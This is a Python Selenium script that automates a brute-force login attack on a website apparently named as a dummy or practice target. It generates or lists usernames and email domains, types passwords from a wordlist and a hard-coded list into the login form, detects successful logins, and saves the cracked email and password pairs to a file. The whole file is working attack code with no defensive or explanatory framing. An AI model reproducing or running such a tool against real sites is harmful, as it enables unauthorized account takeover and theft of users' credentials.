from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.by import By
from cracked import brute_u
from selenium.webdriver.common.keys import Keys
import time

e_pass = open('emailpass.txt', 'w')
f = open('passwords.txt', 'r')
b_list = brute_u(2)

ser = Service("H://chromedriver.exe")
driver = webdriver.Chrome(service=ser)

driver.get("https://dummy.antknee.dev/")
act = ActionChains(driver)

g_user = ['uranium342', 'selenium86', 'hydrogen999']
email = ['@yahoo.com', '@gmail.com', '@hotmail.com', '@bigmac.com', '@whataburger.com', '@mail.com']
p_pass = ["livinglaughinglovinglatrine578", "unfortunateUFO<3", "malignantmarsupial246", "wingedwitched53", "mypasswordisgood225", "mypasswordisgood224", "frenchandfries29", "chickennoodlesoup32"]

logi = driver.find_element(By.LINK_TEXT, 'Login')
act.click(on_element=logi).perform()
time.sleep(15)
url_log = driver.current_url
url_suc = 'https://dummy.antknee.dev/'

for w in b_list[1:]:
    for em in email:
        act.reset_actions()
        e_sub = driver.find_element(By.NAME, 'Input.Email')
        act.click(on_element=e_sub).key_down(Keys.CONTROL).send_keys(Keys.ARROW_RIGHT + Keys.ARROW_RIGHT + Keys.ARROW_RIGHT + Keys.ARROW_RIGHT + Keys.ARROW_RIGHT + Keys.BACKSPACE + Keys.BACKSPACE + Keys.BACKSPACE + Keys.BACKSPACE + Keys.BACKSPACE).perform()
        act.reset_actions()
        act.click(on_element=e_sub).send_keys(w + em).perform()
        password = ''
        while driver.current_url != url_suc:
            for p in f:
                act.reset_actions()
                p_sub = driver.find_element(By.NAME, 'Input.Password')
                act.click(on_element=p_sub).send_keys(p).perform()
                act.reset_actions()
                act.send_keys(Keys.ENTER).perform()
                time.sleep(1)
                password = p
                if driver.current_url == url_suc:
                    break
            break
        if driver.current_url == url_suc:
            e_pass.write(w + em + ', ' + password + '\n')
            l_out = driver.find_element(By.LINK_TEXT, 'Logout')
            act.reset_actions()
            act.click(on_element=l_out).perform()
            time.sleep(1)
            act.reset_actions()
            l_in = driver.find_element(By.LINK_TEXT, 'Login')
            act.click(on_element=l_in).perform()
            time.sleep(1)
            url_log = driver.current_url
            break

for w in g_user:
    for em in email:
        act.reset_actions()
        e_sub = driver.find_element(By.NAME, 'Input.Email')
        act.click(on_element=e_sub).key_down(Keys.CONTROL).send_keys(Keys.ARROW_RIGHT + Keys.ARROW_RIGHT + Keys.ARROW_RIGHT + Keys.ARROW_RIGHT + Keys.ARROW_RIGHT + Keys.BACKSPACE + Keys.BACKSPACE + Keys.BACKSPACE + Keys.BACKSPACE + Keys.BACKSPACE).perform()
        act.reset_actions()
        act.click(on_element=e_sub).send_keys(w + em).perform()
        password = ''
        while driver.current_url != url_suc:
            for p in p_pass:
                act.reset_actions()
                p_sub = driver.find_element(By.NAME, 'Input.Password')
                act.click(on_element=p_sub).send_keys(p).perform()
                act.reset_actions()
                act.send_keys(Keys.ENTER).perform()
                time.sleep(1)
                password = p
                if driver.current_url == url_suc:
                    break
            break
        if driver.current_url == url_suc:
            e_pass.write(w + em + ', ' + password + '\n')
            l_out = driver.find_element(By.LINK_TEXT, 'Logout')
            act.reset_actions()
            act.click(on_element=l_out).perform()
            time.sleep(1)
            act.reset_actions()
            l_in = driver.find_element(By.LINK_TEXT, 'Login')
            act.click(on_element=l_in).perform()
            time.sleep(1)
            url_log = driver.current_url
            break







